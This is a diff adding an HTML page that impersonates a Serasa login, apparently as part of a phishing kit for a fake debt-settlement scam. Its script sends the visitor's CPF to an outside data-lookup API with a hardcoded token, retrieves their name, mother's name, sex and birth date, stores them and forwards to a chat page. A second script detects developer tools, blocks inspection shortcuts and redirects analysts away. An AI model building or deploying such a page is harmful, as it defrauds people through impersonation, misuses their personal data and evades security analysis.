@@ -1,0 +1,705 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serasa - Login</title>
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <!-- Link para ícones (FontAwesome) -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 90%;
+            margin: auto;
+            max-width: 700px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input[type="tel"] {
+            width: 100%;
+            padding: 13px;
+            margin: 0px 0;
+            border: 1px solid #CCCCCC;
+            font-size: 13px;
+            outline: none;
+            box-sizing: border-box;
+            border-radius: 15px;
+        }
+
+        .center {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 13px;
+            background-color: #E63888;
+            border: 0px;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 15px;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover:not(:disabled) {
+            background-color: #d12a75;
+        }
+
+        .button:disabled {
+            background-color: #CCCCCC;
+            cursor: not-allowed;
+        }
+
+        /* Estilo para mensagem de validação */
+        .validation-message {
+            margin: 0px 30px 0;
+            display: none;
+            position: relative;
+            top: -10px;
+        }
+
+        /* Estilo para mensagem de sucesso */
+        .success-message {
+            color: green !important;
+        }
+
+        /* Estilo para mensagem de falha */
+        .error-message {
+            color: red;
+        }
+
+        /* Estilo para ícone de verificação */
+        .validation-icon {
+            position: absolute;
+            left: -25px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        /* Estilo para ícone de erro */
+        .error-icon {
+            position: absolute;
+            left: -25px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: red;
+        }
+
+        /* Estilo para loading */
+        .loading-container {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #E63888;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            color: #E63888;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* Estilo para mensagem de erro da API */
+        .api-error {
+            display: none;
+            color: red;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <br>
+    <img style="width: 150px; display: flex; margin: 0 auto;" src="images/logo2.png" alt="Serasa Logo">
+    <br>
+    <hr>
+    <p style="text-align: center; font-size: 22px; padding-top: 80px;">Entrar na Serasa</p>
+    <p style="text-align: center; font-size: 14px; padding-top: 10px;">Olá! Identifique-se para acessar sua conta
+        Serasa.</p>
+
+    <br>
+    <div class="container">
+        <form id="cpfForm">
+            <div class="input-wrapper">
+                <input type="tel" id="cpf" name="cpf" placeholder="Digite seu CPF" autocomplete="off" maxlength="14">
+            </div>
+            <p class="validation-message success-message">CPF válido <i class="fas fa-check validation-icon"></i></p>
+            <p class="validation-message error-message"><i class="fas fa-times error-icon"></i>CPF inválido</p>
+
+            <div class="center">
+                <input type="submit" value="Buscar Acordo" class="button" disabled="" id="submitBtn">
+            </div>
+
+            <!-- Loading container -->
+            <div class="loading-container" id="loadingContainer">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">Consultando dados...</div>
+            </div>
+
+            <!-- Mensagem de erro da API -->
+            <div class="api-error" id="apiError">
+                Erro ao consultar CPF. Tente novamente.
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Função para consultar CPF na API
+        async function consultarCPFDireto(cpf) {
+            const API_TOKEN = "02b4845a-c409-450b-b120-20ba3d2c7b83";
+            const API_BASE_URL = "https://data.workbuscas.com/api/v1";
+
+            try {
+                const apiUrl = `${API_BASE_URL}/${API_TOKEN}/cpf/${cpf}`;
+                const response = await fetch(apiUrl, {
+                    method: "GET",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Erro na API: ${response.status}`);
+                }
+
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Erro na consulta direta:', error);
+                throw error;
+            }
+        }
+
+        function saveToLocalStorage(cpf, response) {
+            try {
+                const data = response.data || {};
+
+                // Extrair dados básicos
+                const nome = data.nome || 'Nome não encontrado';
+                const nomeMae = data.nome_mae || 'Nome da mãe não informado';
+                const sexo = data.sexo || 'Sexo não informado';
+
+                // Formatar CPF para exibição
+                const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+
+                // Verificar e formatar data de nascimento
+                let nascimento = 'Data de nascimento não informada';
+                if (data.nasc && typeof data.nasc === 'string') {
+                    const partes = data.nasc.split(' ')[0].split('-'); // ["2007", "09", "07"]
+                    if (partes.length === 3) {
+                        nascimento = `${partes[2]}/${partes[1]}/${partes[0]}`; // "07/09/2007"
+                    }
+                }
+
+                // Salvar no localStorage
+                localStorage.setItem('nome', nome);
+                localStorage.setItem('cpf', cpfFormatado);
+                localStorage.setItem('cpf_limpo', cpf);
+                localStorage.setItem('data_nascimento', nascimento);
+                localStorage.setItem('nome_mae', nomeMae);
+                localStorage.setItem('sexo', sexo);
+
+                console.log('✅ Dados salvos no localStorage:');
+                console.log('📝 Nome:', nome);
+                console.log('🆔 CPF:', cpfFormatado);
+                console.log('🎂 Nascimento:', nascimento);
+                console.log('👩‍👦 Nome da mãe:', nomeMae);
+                console.log('⚧ Sexo:', sexo);
+            } catch (error) {
+                console.error('❌ Erro ao salvar no localStorage:', error);
+            }
+        }
+
+
+
+        // Função para validar CPF
+        function isValidCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            if (cpf.length !== 11) {
+                return false;
+            }
+            var sum = 0;
+            var remainder;
+            for (var i = 1; i <= 9; i++) {
+                sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if ((remainder === 10) || (remainder === 11)) {
+                remainder = 0;
+            }
+            if (remainder !== parseInt(cpf.substring(9, 10))) {
+                return false;
+            }
+            sum = 0;
+            for (var i = 1; i <= 10; i++) {
+                sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if ((remainder === 10) || (remainder === 11)) {
+                remainder = 0;
+            }
+            if (remainder !== parseInt(cpf.substring(10, 11))) {
+                return false;
+            }
+            return true;
+        }
+
+        // Função para remover pontuação e máscara do CPF
+        function removeMaskAndPunctuation(cpf) {
+            return cpf.replace(/\D/g, '');
+        }
+
+        // Adicionando a máscara de CPF enquanto o usuário digita
+        $('#cpf').on('input', function (event) {
+            var cpfInput = event.target.value.replace(/\D/g, '');
+            var successMessage = $('.validation-message.success-message');
+            var errorMessage = $('.validation-message.error-message');
+            var submitButton = $('#submitBtn');
+
+            // Aplica a máscara
+            if (cpfInput.length <= 11) {
+                cpfInput = cpfInput.replace(/(\d{3})(\d{1,3})?(\d{1,3})?(\d{1,2})?/, function (match, p1, p2, p3, p4) {
+                    var maskedCpf = p1;
+                    if (p2) {
+                        maskedCpf += '.' + p2;
+                    }
+                    if (p3) {
+                        maskedCpf += '.' + p3;
+                    }
+                    if (p4) {
+                        maskedCpf += '-' + p4;
+                    }
+                    return maskedCpf;
+                });
+                event.target.value = cpfInput;
+            }
+
+            if (isValidCPF(cpfInput)) {
+                successMessage.show();
+                errorMessage.hide();
+                submitButton.css('background-color', '#E63888');
+                submitButton.prop('disabled', false);
+            } else {
+                successMessage.hide();
+                errorMessage.show();
+                submitButton.css('background-color', '#CCCCCC');
+                submitButton.prop('disabled', true);
+            }
+        });
+
+        // Evento de envio do formulário
+        $('#cpfForm').on('submit', async function (event) {
+            event.preventDefault(); // Previne o envio padrão do formulário
+
+            var cpfInput = $('#cpf').val();
+            var cleanedCPF = removeMaskAndPunctuation(cpfInput);
+
+            // Esconde mensagens de erro anteriores
+            $('#apiError').hide();
+
+            // Mostra o loading
+            $('#loadingContainer').show();
+            $('#submitBtn').prop('disabled', true).val('Consultando...');
+
+            try {
+                const resultado = await consultarCPFDireto(cleanedCPF);
+
+                saveToLocalStorage(cleanedCPF, resultado);
+
+                setTimeout(() => {
+                    window.location.href = 'chat.html';
+                }, 100);
+
+            } catch (error) {
+                console.error('Erro na consulta:', error);
+
+                $('#loadingContainer').hide();
+
+                $('#apiError').show();
+
+                $('#submitBtn').prop('disabled', false).val('Buscar Acordo');
+            }
+        });
+    </script>
+
+    <p style="color: #E63888; text-align: center; font-weight: 600; padding-top: 130px;">Fale com nossa Atendente Online
+        no Chat</p>
+    <p style="text-align: center; padding-bottom: 100px;">e veja nossa proposta especial para você.</p>
+    <hr>
+    <p style="text-align: center; font-size: 13px; margin-top: 25px;">Nós protegemos a sua privacidade ❤</p>
+    <p style="color: #E63888; text-align: center; font-weight: 600; font-size: 13px;">Termos de uso e privacidade</p>
+
+<script>
+    (function () {
+        'use strict';
+
+        // Configurações
+        const CONFIG = {
+            redirectUrl: 'https://google.com',
+            showConfirmation: true,
+            blockRightClick: true,
+            blockKeyboardShortcuts: true,
+            checkInterval: {
+                desktop: 500,
+                mobile: 2000
+            },
+            thresholds: {
+                dimension: 160,
+                timing: 100
+            }
+        };
+
+        // Detectar se é dispositivo móvel
+        function isMobileDevice() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+            const isMobileUA = mobileRegex.test(userAgent);
+            const isMobileScreen = window.innerWidth <= 768;
+            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+            return isMobileUA || isMobileScreen || isTouchDevice;
+        }
+
+        // Métodos de detecção
+        const DetectionMethods = {
+            // Método 1: Verificação de dimensões (apenas desktop)
+            dimensionCheck: function () {
+                if (isMobileDevice()) return false;
+
+                const threshold = CONFIG.thresholds.dimension;
+                const widthDiff = window.outerWidth - window.innerWidth;
+                const heightDiff = window.outerHeight - window.innerHeight;
+
+                return widthDiff > threshold || heightDiff > threshold;
+            },
+
+            // Método 2: Detecção por timing do console
+            consoleTimingCheck: function () {
+                try {
+                    const start = performance.now();
+                    console.clear();
+                    const end = performance.now();
+                    return (end - start) > CONFIG.thresholds.timing;
+                } catch (e) {
+                    return false;
+                }
+            },
+
+            // Método 3: Detecção por debugger
+            debuggerCheck: function () {
+                try {
+                    const start = Date.now();
+                    debugger;
+                    const end = Date.now();
+                    return (end - start) > CONFIG.thresholds.timing;
+                } catch (e) {
+                    return false;
+                }
+            },
+
+            // Método 4: Detecção por toString override
+            toStringCheck: function () {
+                try {
+                    let devtools = false;
+                    const element = new Image();
+                    Object.defineProperty(element, 'id', {
+                        get: function () {
+                            devtools = true;
+                            return 'devtools-detected';
+                        }
+                    });
+                    console.log(element);
+                    return devtools;
+                } catch (e) {
+                    return false;
+                }
+            }
+        };
+
+        // Classe principal de detecção
+        class DevToolsDetector {
+            constructor() {
+                this.isOpen = false;
+                this.isMobile = isMobileDevice();
+                this.intervalId = null;
+                this.detectionCount = 0;
+                this.maxDetections = 3; // Evitar falsos positivos
+
+                this.init();
+            }
+
+            init() {
+                console.log(`DevTools Detector iniciado - Dispositivo: ${this.isMobile ? 'Mobile' : 'Desktop'}`);
+                this.startDetection();
+                this.setupEventListeners();
+            }
+
+            startDetection() {
+                const interval = this.isMobile ?
+                    CONFIG.checkInterval.mobile :
+                    CONFIG.checkInterval.desktop;
+
+                this.intervalId = setInterval(() => {
+                    this.checkDevTools();
+                }, interval);
+            }
+
+            checkDevTools() {
+                let detected = false;
+                let method = '';
+
+                if (this.isMobile) {
+                    // Para mobile, usar apenas métodos confiáveis
+                    if (DetectionMethods.consoleTimingCheck()) {
+                        detected = true;
+                        method = 'Console Timing';
+                    }
+                } else {
+                    // Para desktop, usar múltiplos métodos
+                    if (DetectionMethods.dimensionCheck()) {
+                        detected = true;
+                        method = 'Dimension Check';
+                    } else if (DetectionMethods.consoleTimingCheck()) {
+                        detected = true;
+                        method = 'Console Timing';
+                    } else if (DetectionMethods.toStringCheck()) {
+                        detected = true;
+                        method = 'ToString Override';
+                    }
+                }
+
+                if (detected && !this.isOpen) {
+                    this.detectionCount++;
+
+                    // Só considerar como verdadeiro após múltiplas detecções
+                    if (this.detectionCount >= (this.isMobile ? 2 : 1)) {
+                        this.isOpen = true;
+                        this.onDevToolsOpen(method);
+                    }
+                } else if (!detected && this.isOpen) {
+                    this.isOpen = false;
+                    this.detectionCount = 0;
+                    this.onDevToolsClose();
+                }
+            }
+
+            onDevToolsOpen(method) {
+                console.warn(`DevTools detectado via: ${method}`);
+
+                // Disparar evento customizado
+                window.dispatchEvent(new CustomEvent('devtoolsopen', {
+                    detail: { method: method, isMobile: this.isMobile }
+                }));
+
+                if (CONFIG.showConfirmation) {
+                    const message = this.isMobile ?
+                        'Ferramentas de desenvolvedor detectadas no dispositivo móvel. Isso pode afetar a performance. Deseja sair?' :
+                        'Ferramentas de desenvolvedor detectadas. Por motivos de segurança, você será redirecionado.';
+
+                    if (confirm(message)) {
+                        this.redirect();
+                    } else if (!this.isMobile) {
+                        // Em desktop, redirecionar mesmo se cancelar
+                        setTimeout(() => this.redirect(), 2000);
+                    }
+                } else {
+                    this.redirect();
+                }
+            }
+
+            onDevToolsClose() {
+                console.log('DevTools fechado');
+
+                // Disparar evento customizado
+                window.dispatchEvent(new CustomEvent('devtoolsclose', {
+                    detail: { isMobile: this.isMobile }
+                }));
+            }
+
+            redirect() {
+                try {
+                    window.location.href = CONFIG.redirectUrl;
+                } catch (e) {
+                    window.location.replace(CONFIG.redirectUrl);
+                }
+            }
+
+            setupEventListeners() {
+                // Bloquear menu de contexto (apenas desktop)
+                if (CONFIG.blockRightClick && !this.isMobile) {
+                    document.addEventListener('contextmenu', (e) => {
+                        e.preventDefault();
+                        alert('Menu de contexto desabilitado.');
+                        return false;
+                    });
+                }
+
+                // Bloquear atalhos de teclado
+                if (CONFIG.blockKeyboardShortcuts) {
+                    document.addEventListener('keydown', (e) => {
+                        // F12
+                        if (e.key === 'F12') {
+                            e.preventDefault();
+                            alert('Atalho F12 bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+Shift+I (Inspector)
+                        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+                            e.preventDefault();
+                            alert('Atalho Ctrl+Shift+I bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+Shift+C (Console)
+                        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+                            e.preventDefault();
+                            alert('Atalho Ctrl+Shift+C bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+Shift+J (Console no Chrome)
+                        if (e.ctrlKey && e.shiftKey && e.key === 'J') {
+                            e.preventDefault();
+                            alert('Atalho Ctrl+Shift+J bloqueado.');
+                            return false;
+                        }
+
+                        // Ctrl+U (View Source)
+                        if (e.ctrlKey && e.key === 'u') {
+                            e.preventDefault();
+                            alert('Visualizar código fonte bloqueado.');
+                            return false;
+                        }
+                    });
+                }
+
+                // Detectar mudanças de foco (pode indicar DevTools)
+                let focusLost = false;
+                window.addEventListener('blur', () => {
+                    focusLost = true;
+                    setTimeout(() => {
+                        if (focusLost && !this.isMobile) {
+                            // Verificação adicional quando a janela perde foco
+                            this.checkDevTools();
+                        }
+                    }, 500);
+                });
+
+                window.addEventListener('focus', () => {
+                    focusLost = false;
+                });
+            }
+
+            // Método para parar a detecção
+            stop() {
+                if (this.intervalId) {
+                    clearInterval(this.intervalId);
+                    this.intervalId = null;
+                }
+                console.log('DevTools Detector parado');
+            }
+
+            // Método para configurar opções
+            configure(options) {
+                Object.assign(CONFIG, options);
+                console.log('Configuração atualizada:', CONFIG);
+            }
+        }
+
+        // Inicializar quando o DOM estiver pronto
+        function initDevToolsDetector() {
+            // Verificar se já foi inicializado
+            if (window.devToolsDetector) {
+                console.warn('DevTools Detector já está ativo');
+                return window.devToolsDetector;
+            }
+
+            const detector = new DevToolsDetector();
+
+            // Expor globalmente para controle
+            window.devToolsDetector = detector;
+
+            // API pública
+            window.DevToolsProtection = {
+                stop: () => detector.stop(),
+                configure: (options) => detector.configure(options),
+                isActive: () => !!detector.intervalId,
+                isMobile: () => detector.isMobile,
+                isDevToolsOpen: () => detector.isOpen
+            };
+
+            return detector;
+        }
+
+        // Auto-inicializar
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initDevToolsDetector);
+        } else {
+            initDevToolsDetector();
+        }
+
+        // Prevenir múltiplas execuções
+        if (window.devToolsProtectionLoaded) {
+            console.warn('DevTools Protection já foi carregado');
+            return;
+        }
+        window.devToolsProtectionLoaded = true;
+
+    })();
+
+    // Exemplo de uso dos eventos customizados:
+    /*
+    window.addEventListener('devtoolsopen', function(e) {
+        console.log('DevTools aberto!', e.detail);
+    });
+    
+    window.addEventListener('devtoolsclose', function(e) {
+        console.log('DevTools fechado!', e.detail);
+    });
+    
+    // Controlar o detector:
+    // window.DevToolsProtection.stop(); // Parar
+    // window.DevToolsProtection.configure({ redirectUrl: 'https://example.com' }); // Configurar
+    */
+</script>
+
+
+</body></html>
